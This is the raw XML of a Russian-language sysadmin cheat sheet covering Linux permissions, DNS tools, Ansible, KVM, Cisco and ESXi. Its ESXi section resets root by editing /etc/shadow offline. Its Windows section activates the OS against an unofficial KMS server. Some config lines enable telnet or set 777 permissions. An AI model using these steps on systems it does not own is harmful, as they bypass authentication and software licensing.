      <text:p text:style-name="P1"><text:span text:style-name="T1">Работа с правами доступа файлов и директорий в </text:span><text:span text:style-name="T3">Linux</text:span><text:span text:style-name="T1">:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chown</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">vasya</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1"> - Назначить пользователя </text:span><text:span text:style-name="T3">vasya</text:span><text:span text:style-name="T1"> владельцем файла </text:span><text:span text:style-name="T3">file</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chown</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">R</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">vasya</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">directory</text:span><text:span text:style-name="T1"> - Рекурсивно обойти директорию </text:span><text:span text:style-name="T3">directory</text:span><text:span text:style-name="T1"> и назначить пользователя </text:span><text:span text:style-name="T3">vasya</text:span><text:span text:style-name="T1"> владельцем всех вложенных файлов и директорий</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chown</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">vasya</text:span><text:span text:style-name="T1">:</text:span><text:span text:style-name="T3">group</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1"> - Назначить владельца и группу для файла /</text:span><text:span text:style-name="T3">file</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chmod</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">ugo</text:span><text:span text:style-name="T1">+</text:span><text:span text:style-name="T3">rwx</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">directory</text:span><text:span text:style-name="T1"> - Установить полные права доступа </text:span><text:span text:style-name="T3">rwx</text:span><text:span text:style-name="T1"> ( </text:span><text:span text:style-name="T3">Read</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Write</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">eXecute</text:span><text:span text:style-name="T1"> ) для всех </text:span><text:span text:style-name="T3">ugo</text:span><text:span text:style-name="T1"> ( </text:span><text:span text:style-name="T3">User</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Group</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Other</text:span><text:span text:style-name="T1"> ) на директорию /</text:span><text:span text:style-name="T3">directory</text:span><text:span text:style-name="T1">. То-же самое можно сделать, используя числовой представление </text:span><text:span text:style-name="T3">chmod</text:span><text:span text:style-name="T1"> 777 </text:span><text:span text:style-name="T3">directory</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chmod</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">go</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">rwx</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">directory</text:span><text:span text:style-name="T1"> - Удалить все права на директорию /</text:span><text:span text:style-name="T3">directory</text:span><text:span text:style-name="T1"> для группы и остальных</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chgrp</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">new</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">group</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1"> - Изменить группу-владельца для </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1"> на </text:span><text:span text:style-name="T3">new</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">group</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chmod</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">o</text:span><text:span text:style-name="T1">+</text:span><text:span text:style-name="T3">t</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">home</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">public</text:span><text:span text:style-name="T1"> - Установить так называемый </text:span><text:span text:style-name="T3">STIKY</text:span><text:span text:style-name="T1">-бит на директорию /</text:span><text:span text:style-name="T3">home</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">public</text:span><text:span text:style-name="T1">. Удалить файл в такой директории может только владелец данного файла</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chmod</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">o</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">t</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">home</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">public</text:span><text:span text:style-name="T1"> - Удалить </text:span><text:span text:style-name="T3">STIKY</text:span><text:span text:style-name="T1">-бит с директории /</text:span><text:span text:style-name="T3">home</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">public</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># chmod u+s /bin/binary_file - </text:span><text:span text:style-name="T1">Установить</text:span><text:span text:style-name="T3"> SUID-</text:span><text:span text:style-name="T1">бит</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">на</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">файл</text:span><text:span text:style-name="T3"> /bin/binary_file. </text:span><text:span text:style-name="T1">Это позволяет любому пользователю системы, запускать данный файл с правами владельца файла</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># chmod u-s /bin/binary_file - Удалить SUID-бит с файла /bin/binary_file</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># chmod g+s /home/public - </text:span><text:span text:style-name="T1">Установить</text:span><text:span text:style-name="T3"> SGID-</text:span><text:span text:style-name="T1">бит</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">на</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">директории</text:span><text:span text:style-name="T3"> /home/public</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># chmod g-s /home/public - Удалить SGID-бит с директории /home/public</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">find</text:span><text:span text:style-name="T1"> / -</text:span><text:span text:style-name="T3">perm</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">u</text:span><text:span text:style-name="T1">+</text:span><text:span text:style-name="T3">s</text:span><text:span text:style-name="T1"> - Поиск всех файлов с установленным </text:span><text:span text:style-name="T3">SUID</text:span><text:span text:style-name="T1"> битом, начиная с корня файловой системы</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">ls</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">lh</text:span><text:span text:style-name="T1"> - Листинг текущего каталога с правами доступа</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Скрипты для диагностики </text:span><text:span text:style-name="T3">DNS</text:span><text:span text:style-name="T1">:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">DNS</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">TESTER</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Тестирование скорости ответа </text:span><text:span text:style-name="T3">DNS</text:span><text:span text:style-name="T1"> со статистикой превышения, минимума, максимума - </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">github</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">com</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">m</text:span><text:span text:style-name="T1">0</text:span><text:span text:style-name="T3">zgen</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">dns</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">tester</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">BENCH</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">DNS</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Простой скрипт для тестирования загрузки </text:span><text:span text:style-name="T3">DNS</text:span><text:span text:style-name="T1">. Написан на языке </text:span><text:span text:style-name="T3">Go</text:span><text:span text:style-name="T1"> - </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">github</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">com</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">m</text:span><text:span text:style-name="T1">0</text:span><text:span text:style-name="T3">zgen</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">bench</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">dns</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">CHECK-DNS-SERVERS</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Проверка</text:span><text:span text:style-name="T3"> DNS - </text:span><text:span text:style-name="T1">Дата</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">сертификата</text:span><text:span text:style-name="T3">, DNS resolve, HTTP 200 - https://github.com/m0zgen/check-dns-servers</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">MAC-DNS</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Очистка кэша DNS и настройка DNS IP сервисов - Google, Cloudflare, BLD - https://github.com/m0zgen/mac-dns</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">BLD</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">LOOKUP</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">Соберите все </text:span><text:span text:style-name="T3">IP</text:span><text:span text:style-name="T1">-адреса </text:span><text:span text:style-name="T3">DNS</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">BLD</text:span><text:span text:style-name="T1"> и попытайтесь разрешить целевой домен с каждым </text:span><text:span text:style-name="T3">IP</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">BLD</text:span><text:span text:style-name="T1"> - </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">github</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">com</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">m</text:span><text:span text:style-name="T1">0</text:span><text:span text:style-name="T3">zgen</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">bld</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">lookup</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Как сменить пароль Linux пользователя при помощи Ansible: </text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">change_password.yml</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">---</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">- name: user module demo</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="2"/>hosts: all</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="2"/>become: true</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="2"/>vars:</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>myuser: "example"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>mypassword: "password"</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="2"/>tasks:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>- name: change password</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="6"/>ansible.builtin.user:</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>name: "{{ myuser }}"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>state: present</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>password: "{{ mypassword | password_hash('sha512') }}"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Запуск</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">ansible-playbook change_password.yml</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">1. Пройдите по ссылке (https://learn.microsoft.com/ru-ru/windows-server/get-started/kms-client-activation-keys) и скопируйте ключ, подходящий под вашу версию Windows.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">2. В поиске введите «cmd», тапните правой кнопкой по приложению «Командная строка» и выберите «Запуск от имени администратора».</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">3. Введите команду «slmgr/ipk &lt;ваш_скопированный_ключ&gt;».</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">4. После введите «slmgr /skms kms.digiboy.ir».</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">5. Последняя команда «slmgr /ato».</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">Если все сделано правильно, вы получите сообщение об успешной активации Windows.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Выключить машину: virsh shutdown vm1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Сделать дамп конфигурации машины: virsh dumpxml vm1 &gt; ~/vm1.xml</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Скопировать данные на другой хост:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">scp ~/vm1.xml server2:/path/to/folder/</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">scp /var/lib/libvirt/images/vm1.qcow2 server2:/var/lib/libvirt/images/</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Действия</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">на</text:span><text:span text:style-name="T3"> server2:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Импортировать</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">конфиг</text:span><text:span text:style-name="T3">: virsh define /path/to/folder/vm1.xml</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Запустить виртуалную машину:virsh start vm1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Удаление виртуальной машины KVM:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Удалить машину: virsh undefine vm1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Удалить</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">диск</text:span><text:span text:style-name="T3">: virsh vol-delete --pool default vm1</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">Убедиться, что файл образа так же удален: rm /var/lib/libvirt/images/vm1.qcow2</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Безопасность Linux (серия из 5 частей):</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">1. Некоторые мысли о безопасности Linux (https://dev.to/jmau111/some-thoughts-about-linux-security-545n);</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">2. Bash-скрипт для настройки Linux (https://dev.to/jmau111/a-bash-script-to-configure-linux-565n);</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">3. Как проверить Linux-машину (https://dev.to/jmau111/how-to-inspect-a-linux-machine-4p49);</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">4. Мысли о безопасности ОС (https://dev.to/jmau111/thoughts-on-os-security-4gmk);</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">5. SELinux: руководство для начинающих (https://dev.to/jmau111/selinux-beginners-guide-15af)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Полезный софт под Android:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Termius (ex. ServerAuditor) - Быстрая, функциональная, удобная программка для доступа к серверу по SSH. https://www.termius.com/ https://4pda.to/forum/index.php?showtopic=419987</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">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text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">OpenVPN Connect - Официальное приложение для Access Server, OpenVPN Cloud и сервисов, совместимых с OpenVPN https://4pda.to/forum/index.php?showtopic=727790 https://play.google.com/store/apps/details?id=net.openvpn.openvpn&amp;hl=ru&amp;gl=US</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Total Commander - Двухпанельный файловый менеджер для Android с русским интерфейсом https://4pda.to/forum/index.php?showtopic=224555 https://play.google.com/store/apps/details?id=com.ghisler.android.TotalCommander&amp;hl=ru&amp;gl=US</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T1">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span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">WiFi network Analyzer - Это приложение отслеживает и анализирует Вашу сеть и предупреждает если есть проблемы https://4pda.to/forum/index.php?showtopic=662401</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">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3">Search-ADAccount -AccountExpiring -UsersOnly -TimeSpan 07.00:00:00 | Sort-Object -Descending AccountExpirationDate | ft Name, AccountExpirationDate. </text:span><text:span text:style-name="T1">Устанавливаем TimeSpan на одну неделю и получаем список учетных записей срок действия которых закончится в течение одной недели (7 дней).</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Команды Linux:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">ulimit - команда для вывода информации о лимитах ресурсов текущего пользователя;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">umount - команда для отключения файловой системы заданного устройства;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">uname - команда для вывода информации о версии ядра операционной системы;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">uniq - команда для удаления повторяющихся строк из текстового файла;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">unlink - команда для удаления ссылки на элемент файловой системы;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">unzip - команда для распаковки архива формата ZIP;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">uptime - команда для вывода информации о времени, в течение которого ваш компьютер функционирует;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">useradd - команда для создания новой учетной записи пользователя;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">userdel - команда для удаления учетной записи пользователя;</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">usermod - команда для изменения параметров учетной записи пользователя</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Как быстро сбросить пароль от Root в ESXI ? / ESXI / root password /</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># sudo su</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># fdisk - l | grep /dev/sda</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># mkdir /mnt/sda5</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># mkdir /temp</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># mount /dev/sda5 /mnt/sda5</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># ls -l /mnt/sda5/state.tgz</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># tar -xf /mnt/sda5/state.tgz - C /temp/</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3"># tar -xf /temp/local.tgz - C /temp/</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># rm /temp/*.tgz</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># nano /temp/etc/shadow</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># nano /temp/etc/shadow</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># cd /temp</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># tar -czf local.tgz etc</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3"># tar -czf state.tgz local.tgz</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3"># mv state.tgz /mnt/sda5/</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># umount /mnt/sda5</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3"># reboot</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Cisco. </text:span><text:span text:style-name="T1">Базовая настройка:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Заливаем последнюю прошивку(для </text:span><text:span text:style-name="T3">SSH</text:span><text:span text:style-name="T1"> необходим минимум </text:span><text:span text:style-name="T3">Advanced</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Security</text:span><text:span text:style-name="T1">), избавляемся от преднастроенного мусора и перегружаемся - </text:span><text:span text:style-name="T3">erase</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">startup</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">config</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Включаем шифрование паролей - </text:span><text:span text:style-name="T3">service</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">password</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">encryption</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Используем новую модель ААА и локальную базу пользователей - </text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">aaa new-model</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">aaa authentication login default local</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Заводим пользователя с максимальными правами - </text:span><text:span text:style-name="T3">username</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">user</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">privilege</text:span><text:span text:style-name="T1"> 15 </text:span><text:span text:style-name="T3">secret</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">password</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Назначаем имя роутеру - </text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">hostname</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">R</text:span><text:span text:style-name="T1">1</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">ip</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">domain</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">name</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">R</text:span><text:span text:style-name="T1">1.</text:span><text:span text:style-name="T3">domain</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Генерируем ключ для </text:span><text:span text:style-name="T3">SSH</text:span><text:span text:style-name="T1"> - </text:span><text:span text:style-name="T3">crypto</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">key</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">generate</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">rsa</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Настраиваем SSH - </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">ip ssh authentication-retries 5</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">ip ssh version 2</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">ip ssh time-out 60</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Разрешаем </text:span><text:span text:style-name="T3">telnet</text:span><text:span text:style-name="T1"> и </text:span><text:span text:style-name="T3">ssh</text:span><text:span text:style-name="T1"> на удаленной консоли и делаем доступ сразу в привилегированный режим 15го уровня </text:span><text:span text:style-name="T3">line</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">vty</text:span><text:span text:style-name="T1"> 0 4 - </text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">transport input telnet ssh</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">privilege level 15</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Отключаем доступ по </text:span><text:span text:style-name="T3">http</text:span><text:span text:style-name="T1"> и </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1"> - </text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">no ip http server</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">no ip http secure-server</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Настройка временной зоны и </text:span><text:span text:style-name="T3">ntp</text:span><text:span text:style-name="T1"> - </text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">clock timezone MSK 3</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">ntp server 146.0.32.144</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Настраиваем DNS - </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">ip domain name domain</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">ip name-server 8.8.8.8</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Блокируем доступ при определённом количестве неправильных попыток - login block-for 600 attempts 5 within 30</text:span><text:span text:style-name="T3"/></text:p>
